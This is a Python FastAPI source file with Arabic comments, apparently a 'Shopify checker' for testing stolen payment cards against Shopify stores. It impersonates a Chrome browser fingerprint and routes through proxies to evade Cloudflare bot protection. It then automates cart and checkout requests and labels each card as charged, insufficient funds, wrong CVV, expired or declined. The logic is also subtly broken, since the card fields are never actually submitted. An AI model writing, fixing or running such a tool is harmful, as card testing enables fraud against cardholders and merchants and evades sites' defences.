from fastapi import FastAPI, Query
from curl_cffi.requests import AsyncSession  # المكتبة المتطورة لتجاوز حماية كلود فلير
from bs4 import BeautifulSoup
import re
import json

app = FastAPI(title="Shopify Advanced Checker API")

async def check_shopify_card(cc: str, site: str, proxy: str):
    try:
        parts = cc.split("|")
        if len(parts) != 4:
            return "❌ INVALID FORMAT"
        card_num, month, year, cvv = parts
        
        base_url = f"https://{site}"
        add_url = f"{base_url}/cart/add.js"
        checkout_url = f"{base_url}/checkout"
        
        # تجهيز البروكسي بالصيغة التي تفهمها curl_cffi
        proxies_dict = {"http": proxy, "https": proxy} if proxy else None
        
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Sec-Ch-Ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1"
        }
        
        # تفعيل المحاكي لتوليد بصمة كروم حقيقية (impersonate="chrome120")
        async with AsyncSession(headers=headers, impersonate="chrome120", proxies=proxies_dict, timeout=15) as session:
            
            # -----------------------------------------------------------
            # الخطوة 1: جلب آيدي منتج حقيقي ديناميكياً
            # -----------------------------------------------------------
            variant_id = None
            try:
                prod_resp = await session.get(f"{base_url}/products.json?limit=1")
                if prod_resp.status_code == 200:
                    prod_data = prod_resp.json()
                    if prod_data.get("products") and len(prod_data["products"]) > 0:
                        variants = prod_data["products"][0].get("variants")
                        if variants:
                            variant_id = str(variants[0].get("id"))
            except Exception:
                pass

            if not variant_id:
                try:
                    html_resp = await session.get(f"{base_url}/collections/all")
                    if html_resp.status_code == 200:
                        html_text = html_resp.text
                        matches = re.findall(r'id"*\s*:\s*(\d{10,15})|variant"*\s*:\s*(\d{10,15})', html_text)
                        if matches:
                            for m in matches:
                                found_id = m[0] or m[1]
                                if found_id:
                                    variant_id = found_id
                                    break
                except Exception:
                    pass

            if not variant_id:
                variant_id = "41234567890"

            # إضافة المنتج للسلة
            payload = {"id": variant_id, "quantity": 1} 
            try:
                r = await session.post(add_url, json=payload)
                if r.status_code not in [200, 201, 302]: 
                    # إذا رجع كود 403 يعني الآي بي محظور تماماً من الحماية
                    if r.status_code == 403:
                        return "⚠️ BLOCKED BY PROTECTION (Cloudflare)"
                    return "🌐 SITE ERROR (Cart Add Failed)"
            except Exception:
                return "🌐 SITE ERROR (Connection Failed)"

            # الخطوة 2: فتح صفحة الدفع وصيد التوكن
            try:
                r = await session.get(checkout_url)
                html_content = r.text
                final_url = str(r.url)
            except Exception:
                return "🌐 SITE ERROR (Checkout Access Failed)"

            if "cloudflare" in html_content.lower() or "challenge" in html_content.lower() or r.status_code == 403:
                return "⚠️ BLOCKED BY PROTECTION (Cloudflare)"

            soup = BeautifulSoup(html_content, 'html.parser')
            auth_token_element = soup.find('input', {'name': 'authenticity_token'})
            if not auth_token_element:
                return "⚠️ TOKEN ERROR"
            auth_token = auth_token_element.get('value', '')

            # الخطوة 3: إرسال بيانات الشحن
            shipping_data = {
                "authenticity_token": auth_token,
                "checkout[email]": "testuser122@gmail.com",
                "checkout[shipping_address][first_name]": "John",
                "checkout[shipping_address][last_name]": "Doe",
                "checkout[shipping_address][address1]": "123 Street",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][zip]": "10001",
                "checkout[shipping_address][country]": "United States"
            }
            
            try:
                r = await session.post(checkout_url, data=shipping_data)
                html_res = r.text
                final_res_url = str(r.url)
            except Exception as e:
                return f"🌐 REQUEST ERROR: {str(e)}"

            response_text = html_res.lower()
            
            # الخطوة 4: الفرز والتصنيف المعتمد
            if "thank_you" in final_res_url or "order_confirmed" in final_res_url or "شكرا لك" in html_res:
                return "🟢 APPROVED / CHARGED"
                
            notice_element = soup.find(class_=re.compile("notice__text|error-message|warning"))
            error_reason = notice_element.text.strip().lower() if notice_element else ""

            if any(x in response_text or x in error_reason for x in ["insufficient", "funds", "رصيد غير كاف"]):
                return "🟡 INSUFFICIENT FUNDS"
            elif any(x in response_text or x in error_reason for x in ["security code is incorrect", "cvv", "incorrect_cvv"]):
                return "🟠 WRONG CVV"
            elif any(x in response_text or x in error_reason for x in ["expiration", "expired"]):
                return "❌ EXPIRED CARD"
            elif any(x in response_text or x in error_reason for x in ["declined", "rechazada", "مرفوضة"]):
                return "🔴 DECLINED"
            elif "cloudflare" in response_text or "captcha" in response_text:
                return "⚠️ BLOCKED BY PROTECTION"
            else:
                return f"❓ UNKNOWN RESP: {error_reason[:50] if error_reason else 'No error text'}"

    except Exception as e:
        return f"🛠️ INTERNAL ERROR: {str(e)}"

@app.get("/")
def read_root():
    return {"status": "online", "message": "Shopify Checker API is running perfectly!"}

@app.get("/check")
async def check_card(
    cc: str = Query(..., description="cc|month|year|cvv"),
    site: str = Query(..., description="store.com"),
    proxy: str = Query(..., description="proxy url")
):
    result = await check_shopify_card(cc, site, proxy)
    return {"cc": cc, "site": site, "result": result}

